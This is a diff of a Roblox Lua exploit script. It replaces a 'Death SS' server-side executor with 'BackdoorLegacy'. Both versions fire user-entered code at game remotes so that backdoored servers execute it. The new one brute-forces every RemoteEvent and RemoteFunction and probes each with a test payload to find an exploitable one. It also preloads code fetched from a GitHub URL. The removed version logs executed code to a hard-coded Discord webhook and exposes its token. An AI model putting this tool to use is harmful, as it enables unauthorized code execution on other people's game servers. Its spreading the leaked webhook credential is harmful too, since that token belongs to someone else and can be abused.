@@ -1,236 +1,200 @@
-local Players = game:GetService("Players")
-local TweenService = game:GetService("TweenService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local HttpService = game:GetService("HttpService")
+-- Import from URL feature coming soon!
 
-local LocalPlayer = Players.LocalPlayer
-local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
-local WEBHOOK = "https://discord.com/api/webhooks/1393626932444135556/6CCtBAxFJ0NabJgxOJ8jsvCsbdMxdjmCYqU7UK3vzhcH-YgcwxDrKTsNZoEgsALcOypX"
+print("Backdoor Legacy // Successfully booted up!")
+local function debug(msg)
+	if 0 == 1 then 
+	game:GetService('TestService'):Message('BackdoorLegacy // '..tostring(msg)) -- This is for debugging. 
+	end 
+end 
 
-local function sendWebhook(data)
-    spawn(function()
-        local payload = HttpService:JSONEncode({
-            username = "Death SS",
-            content = data
-        })
-        pcall(function()
-            HttpService:PostAsync(WEBHOOK, payload, Enum.HttpContentType.ApplicationJson)
-        end)
-    end)
-end
+-- Create GUI Objects
 
-local function base64Encode(data)
-    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-    return ((data:gsub('.', function(x)
-        local r, binary = '', x:byte()
-        for i = 8, 1, -1 do
-            r = r .. (binary % 2 ^ i - binary % 2 ^ (i - 1) > 0 and '1' or '0')
-        end
-        return r
-    end) .. '0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
-        if (#x < 6) then return '' end
-        local c = 0
-        for i = 1, 6 do
-            c = c + (x:sub(i, i) == '1' and 2 ^ (6 - i) or 0)
-        end
-        return b:sub(c + 1, c + 1)
-    end) .. ({ '', '==', '=' })[#data % 3 + 1])
-end
+local ScrnGui = Instance.new("ScreenGui")
+local MnPrt = Instance.new("Frame")
+local InPrt = Instance.new("Frame")
+local Cody = Instance.new("TextBox")
+local Execy = Instance.new("TextButton")
+local Acqur = Instance.new("TextButton")
+local Labely = Instance.new("TextLabel")
 
-local function base64Decode(data)
-    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-    data = string.gsub(data, '[^' .. b .. '=]', '')
-    return (data:gsub('.', function(x)
-        if x == '=' then return '' end
-        local r, f = '', (b:find(x) - 1)
-        for i = 6, 1, -1 do
-            r = r .. (f % 2 ^ i - f % 2 ^ (i - 1) > 0 and '1' or '0')
-        end
-        return r
-    end):gsub('%d%d%d%d%d%d%d%d', function(x)
-        local c = 0
-        for i = 1, 8 do
-            c = c + (x:sub(i, i) == '1' and 2 ^ (8 - i) or 0)
-        end
-        return string.char(c)
-    end))
-end
+-- Set Properties
 
-local UI = Instance.new("ScreenGui", PlayerGui)
-UI.Name = "DeathSS"
-UI.ResetOnSpawn = false
+ScrnGui.Name = "BackdoorLegacy"
+ScrnGui.Parent = game:GetService('CoreGui')
+ScrnGui.ResetOnSpawn = false
 
-local TopBar = Instance.new("Frame", UI)
-TopBar.Size = UDim2.new(1, 0, 0, 40)
-TopBar.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
-TopBar.BorderSizePixel = 0
-TopBar.Active = true
-TopBar.Draggable = true
-Instance.new("UICorner", TopBar).CornerRadius = UDim.new(0, 12)
+MnPrt.Active = true
+MnPrt.BackgroundColor3 = Color3.new(0,0,0)
+MnPrt.BorderColor3 = Color3.new(1,0,0)
+MnPrt.Name = "MainPart"
+MnPrt.Parent = ScrnGui
+MnPrt.Position = UDim2.new(.5,-180,.5,-120)
+MnPrt.Size = UDim2.new(0,360,0,240)
+MnPrt.Draggable = true
 
-local Main = Instance.new("Frame", UI)
-Main.Size = UDim2.new(0, 600, 0, 380)
-Main.Position = UDim2.new(0.5, 0, 0.5, 0)
-Main.AnchorPoint = Vector2.new(0.5, 0.5)
-Main.BackgroundColor3 = Color3.fromRGB(22, 22, 28)
-Main.BorderSizePixel = 0
-Main.Active = true
-Main.Draggable = true
-Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 12)
+InPrt.Active = true
+InPrt.BackgroundColor3 = Color3.new(0,0,0)
+InPrt.BorderColor3 = Color3.new(1,0,0)
+InPrt.Name = "Inside"
+InPrt.Parent = MnPrt
+InPrt.Position = UDim2.new(0,0,0,50)
+InPrt.Size = UDim2.new(0,360,0,190)
+InPrt.Draggable = false
 
-local Title = Instance.new("TextLabel", TopBar)
-Title.Size = UDim2.new(1, -50, 1, 0)
-Title.Position = UDim2.new(0, 10, 0, 0)
-Title.BackgroundTransparency = 1
-Title.Text = "Death SS"
-Title.Font = Enum.Font.GothamBold
-Title.TextColor3 = Color3.fromRGB(235, 235, 235)
-Title.TextSize = 20
-Title.TextXAlignment = Enum.TextXAlignment.Left
+Cody.Active = true
+Cody.BackgroundColor3 = Color3.new(0,0,0)
+Cody.BorderColor3 = Color3.new(1,0,0)
+Cody.ClearTextOnFocus = false
+Cody.MultiLine = true
+Cody.Name = "Code"
+Cody.Parent = InPrt
+Cody.Position = UDim2.new(0,5,0,5)
+Cody.Size = UDim2.new(0,350,0,140)
+Cody.Font = Enum.Font.Legacy
+Cody.FontSize = Enum.FontSize.Size8
+Cody.Text = game:HttpGet('https://raw.githubusercontent.com/IvanTheProtogen/BackdoorLegacy/checkerCode/main.lua')
+Cody.TextColor3 = Color3.new(1,0,0)
+Cody.TextWrapped = true
+Cody.TextXAlignment = Enum.TextXAlignment.Left
+Cody.TextYAlignment = Enum.TextYAlignment.Top
 
-local CloseBtn = Instance.new("TextButton", TopBar)
-CloseBtn.Size = UDim2.new(0, 40, 1, 0)
-CloseBtn.Position = UDim2.new(1, -50, 0, 0)
-CloseBtn.BackgroundColor3 = Color3.fromRGB(40, 10, 10)
-CloseBtn.Text = "X"
-CloseBtn.TextColor3 = Color3.fromRGB(255, 80, 80)
-CloseBtn.Font = Enum.Font.GothamBold
-CloseBtn.TextSize = 20
-CloseBtn.BorderSizePixel = 0
-Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 8)
-CloseBtn.MouseEnter:Connect(function()
-    TweenService:Create(CloseBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(70, 20, 20)}):Play()
-end)
-CloseBtn.MouseLeave:Connect(function()
-    TweenService:Create(CloseBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(40, 10, 10)}):Play()
-end)
-CloseBtn.MouseButton1Click:Connect(function() UI:Destroy() end)
+Execy.Active = true
+Execy.BackgroundColor3 = Color3.new(0,0,0)
+Execy.BorderColor3 = Color3.new(1,0,0)
+Execy.Name = "Execute"
+Execy.Parent = InPrt
+Execy.Position = UDim2.new(0,5,0,150)
+Execy.Size = UDim2.new(0,170,0,35)
+Execy.Font = Enum.Font.Legacy
+Execy.FontSize = Enum.FontSize.Size14
+Execy.Text = 'Execute!'
+Execy.TextColor3 = Color3.new(1,0,0)
 
-local TabPanel = Instance.new("Frame", Main)
-TabPanel.Size = UDim2.new(0, 120, 1, -40)
-TabPanel.Position = UDim2.new(0, 0, 0, 40)
-TabPanel.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
-TabPanel.BorderSizePixel = 0
-Instance.new("UICorner", TabPanel).CornerRadius = UDim.new(0, 12)
+Acqur.Active = true
+Acqur.BackgroundColor3 = Color3.new(0,0,0)
+Acqur.BorderColor3 = Color3.new(1,0,0)
+Acqur.Name = "Acquire"
+Acqur.Parent = InPrt
+Acqur.Position = UDim2.new(0,185,0,150)
+Acqur.Size = UDim2.new(0,170,0,35)
+Acqur.Font = Enum.Font.Legacy
+Acqur.FontSize = Enum.FontSize.Size14
+Acqur.Text = 'Acquire!'
+Acqur.TextColor3 = Color3.new(1,0,0)
 
-local EditorFrame = Instance.new("Frame", Main)
-EditorFrame.Size = UDim2.new(1, -120, 1, -65)
-EditorFrame.Position = UDim2.new(0, 120, 0, 40)
-EditorFrame.BackgroundColor3 = Color3.fromRGB(28, 28, 36)
-EditorFrame.BorderSizePixel = 0
-Instance.new("UICorner", EditorFrame).CornerRadius = UDim.new(0, 12)
+Labely.Active = true
+Labely.BackgroundColor3 = Color3.new(0,0,0)
+Labely.BorderColor3 = Color3.new(1,0,0)
+Labely.Name = "Title"
+Labely.Parent = MnPrt
+Labely.Position = UDim2.new(0,180,0,25)
+Labely.Size = UDim2.new(0,0,0,0)
+Labely.Font = Enum.Font.Legacy
+Labely.FontSize = Enum.FontSize.Size14
+Labely.Text = 'BackdoorLegacy v1.1'
+Labely.TextColor3 = Color3.new(1,0,0)
 
-local Editor = Instance.new("TextBox", EditorFrame)
-Editor.Size = UDim2.new(1, -40, 1, -90)
-Editor.Position = UDim2.new(0, 20, 0, 20)
-Editor.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
-Editor.TextColor3 = Color3.fromRGB(235, 235, 235)
-Editor.Font = Enum.Font.Code
-Editor.TextSize = 16
-Editor.ClearTextOnFocus = false
-Editor.MultiLine = true
-Editor.TextXAlignment = Enum.TextXAlignment.Left
-Editor.TextYAlignment = Enum.TextYAlignment.Top
-Editor.PlaceholderText = "Enter your payload here..."
-Editor.BorderSizePixel = 0
-Instance.new("UICorner", Editor).CornerRadius = UDim.new(0, 8)
+-- Add functionalities!
 
-local ButtonFrame = Instance.new("Frame", EditorFrame)
-ButtonFrame.Size = UDim2.new(1, -40, 0, 50)
-ButtonFrame.Position = UDim2.new(0, 20, 1, -60)
-ButtonFrame.BackgroundTransparency = 1
+local AcquiredRemote = nil 
+local IsAcquiring = false 
 
-local function createButton(text, pos)
-    local btn = Instance.new("TextButton", ButtonFrame)
-    btn.Size = UDim2.new(0, 100, 1, 0)
-    btn.Position = UDim2.new(0, pos, 0, 0)
-    btn.BackgroundColor3 = Color3.fromRGB(60, 130, 230)
-    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    btn.Font = Enum.Font.GothamBold
-    btn.TextSize = 16
-    btn.Text = text
-    btn.BorderSizePixel = 0
-    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
-    btn.AutoButtonColor = false
-    btn.MouseEnter:Connect(function()
-        TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(90, 160, 255)}):Play()
-    end)
-    btn.MouseLeave:Connect(function()
-        TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(60, 130, 230)}):Play()
-    end)
-    return btn
-end
-
-local ExecuteBtn = createButton("EXECUTE", 0)
-local ClearBtn = createButton("CLEAR", 120)
-
-local currentRemoteEvent
-local currentRemoteFunction
-
-local function updateRemotes()
-    currentRemoteEvent = nil
-    currentRemoteFunction = nil
-    for _, v in pairs(ReplicatedStorage:GetChildren()) do
-        if v:IsA("RemoteEvent") and v.Name:lower():find("remote") then
-            currentRemoteEvent = v
-        elseif v:IsA("RemoteFunction") and v.Name:lower():find("remote") then
-            currentRemoteFunction = v
-        end
-    end
-end
-updateRemotes()
-ReplicatedStorage.ChildAdded:Connect(updateRemotes)
-ReplicatedStorage.ChildRemoved:Connect(updateRemotes)
-
-ExecuteBtn.MouseButton1Click:Connect(function()
-    local code = Editor.Text
-    if code == "" then
-        sendWebhook("No code entered for execution.")
-        return
-    end
-
-    local encoded = base64Encode(code)
-    local execString = [[
-        local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-        local function decode(data)
-            data = string.gsub(data, '[^'..b..'=]', '')
-            return (data:gsub('.', function(x)
-                if (x == '=') then return '' end
-                local r,f='',(b:find(x)-1)
-                for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
-                return r
-            end):gsub('%d%d%d%d%d%d%d%d', function(x)
-                local c=0
-                for i=1,8 do c=c + (x:sub(i,i) == '1' and 2^(8-i) or 0) end
-                return string.char(c)
-            end))
-        end
-        local decoded = decode("]] .. encoded .. [[")
-        local f = loadstring or load
-        if f then f(decoded)() end
-    ]]
-
-    local success, response
-    if currentRemoteEvent then
-        success, response = pcall(function()
-            currentRemoteEvent:FireServer(execString)
-        end)
-    elseif currentRemoteFunction then
-        success, response = pcall(function()
-            return currentRemoteFunction:InvokeServer(execString)
-        end)
-    else
-        sendWebhook("No remote event or function found to execute the code.")
-        return
-    end
-
-    if success then
-        sendWebhook("Executed code (base64 encoded):\n```lua\n" .. encoded .. "\n```")
-    else
-        sendWebhook("Failed execution:\n```" .. tostring(response) .. "```")
-    end
+Execy.MouseButton1Click:Connect(function()
+	-- Fetch code from TextBox.
+	local CodeStr = Cody.Text
+	local InvokeFunc = Instance.new("BindableEvent")
+	InvokeFunc.Event:Connect(function(rfunc,codestr2)
+		-- This invokes the RemoteFunction without waiting.
+		rfunc:InvokeServer(codestr2)
+	end)
+	local function DeepFire(inst)
+		if not IsAcquiring then 
+		if AcquiredRemote == nil then 
+		-- Search every descendant of DataModel.
+		for _, childy in inst:GetChildren() do
+			-- We don't want remotes from RobloxReplicatedStorage!
+			if childy.Parent ~= game:GetService('RobloxReplicatedStorage') then
+				-- Check the class of the descendant.
+				if childy:IsA("RemoteEvent") then
+					-- If it is a RemoteEvent, fire it with code!
+					print("Backdoor Legacy // Running "..childy.ClassName..' "'..childy.Name..'".')
+					childy:FireServer(CodeStr)
+				elseif childy:IsA("RemoteFunction") then
+					-- Else if it is a RemoteFunction, invoke it with code!
+					print("Backdoor Legacy // Running "..childy.ClassName..' "'..childy.Name..'".')
+					InvokeFunc:Fire(childy, CodeStr)
+				end
+			end
+				-- Keep looping through descendants, until dead end.
+			DeepFire(childy)
+		end 
+		else 
+		if AcquiredRemote:IsA("RemoteEvent") then 
+			AcquiredRemote:FireServer(CodeStr) 
+		elseif AcquiredRemote:IsA("RemoteFunction") then 
+			task.spawn(function() AcquiredRemote:InvokeServer(CodeStr) end) 
+		end
+		end 
+		end
+	end
+	-- Call the function!
+	warn("Backdoor Legacy // Running all remotes with code:\n"..CodeStr)
+	DeepFire(game)
 end)
 
-ClearBtn.MouseButton1Click:Connect(function()
-    Editor.Text = ""
+-- While making this acquire feature, my brain almost exploded.
+
+Acqur.MouseButton1Click:Connect(function() 
+	local RemoteList = {} 
+	local CurrentRemote = nil 
+	local isFound = false
+	if not isAcquiring then 
+		isAcquiring = true 
+		warn('BackdoorLegacy // Scanning Started!') 
+		Cody.Text = '-- Please wait, while we are scanning the remotes.'
+		for i,v in pairs(game:GetDescendants()) do 
+			if v.Parent ~= game:GetService('RobloxReplicatedStorage') then 
+				if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then 
+					debug('Getting '..v.ClassName..' "'..v.Name..'" into RemoteList.')
+					table.insert(RemoteList,v) 
+				end 
+			end
+		end 
+		for a,b in pairs(RemoteList) do
+			if AcquiredRemote == nil then 
+				print("BackdoorLegacy // Checking "..b.ClassName..' "'..b.Name..'".') 
+				local NeededNameOfModel = string.char(math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A)) 
+				local NeededCode = 'Instance.new("Model",workspace).Name="'..NeededNameOfModel ..'"'
+				CurrentRemote = b 
+				if b.Parent ~= game:GetService('RobloxReplicatedStorage') then 
+					if b:IsA('RemoteEvent') then 
+						debug('Fired')
+						b:FireServer(NeededCode) 
+					elseif b:IsA('RemoteFunction') then 
+						debug('Invoked')
+						task.spawn(function() b:InvokeServer(NeededCode) end) 
+					end 
+				end 
+				debug('Awaiting')
+				wait(2.5) 
+				if workspace:FindFirstChild(NeededNameOfModel) then 
+					debug('Detected')
+					if workspace:FindFirstChild(NeededNameOfModel):IsA("Model") then 
+						debug('Success')
+						AcquiredRemote = b
+					end 
+				end 
+			end 
+		end 	
+		if AcquiredRemote ~= nil then 
+			isFound = true 
+			Cody.Text = '-- Remote acquired! :D' 
+			warn('BackdoorLegacy // Remote acquired! :D')
+		else 
+			isFound = false 
+			Cody.Text = '-- Not found. :(' 
+			warn('BackdoorLegacy // Not found. :(')
+		end 
+		isAcquiring = false 
+	end 
 end)
